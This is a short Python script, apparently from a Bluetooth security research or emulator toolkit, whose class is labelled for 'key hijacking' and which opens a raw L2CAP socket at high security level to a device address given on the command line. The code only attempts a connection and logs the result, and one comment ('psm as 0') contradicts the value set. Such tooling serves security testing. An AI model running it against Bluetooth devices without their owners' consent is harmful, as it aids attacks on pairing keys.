import socket
import sys

import tools.emulator.rules.constants as consts
from tools.utils.logs import logger

class BTSocket:
    """_summary_
        bluetooth socket class for key hikacking
    """
    def __init__(self, proto, bt_addr):
        self.sock = socket.socket(family=socket.AF_BLUETOOTH,
                     type=socket.SOCK_RAW,
                     proto=proto)
        self.bt_addr = bt_addr

    def set_security_level(self, level):
        self.sock.setsockopt(consts.SOL_BLUETOOTH,
                             consts.BT_SECURITY,
                             level)

    def key_hijacking(self):
        try:
            psm = 0x0001  # set psm as 0
            addr = (self.bt_addr, psm)
            status = self.sock.connect_ex(addr)
            logger.status(f"Connection status code: {status}")
        except OSError as e:
            logger.error(f"Error connecting to {self.bt_addr}: {e}")
        finally:
            logger.status("Closing socket...")
            self.sock.close()

if __name__ == "__main__":
    bt_addr = sys.argv[1]
    bt_sock = BTSocket(proto=consts.BTPROTO_L2CAP, bt_addr=bt_addr)
    bt_sock.set_security_level(level=consts.BT_SECURITY_HIGH)
    bt_sock.key_hijacking()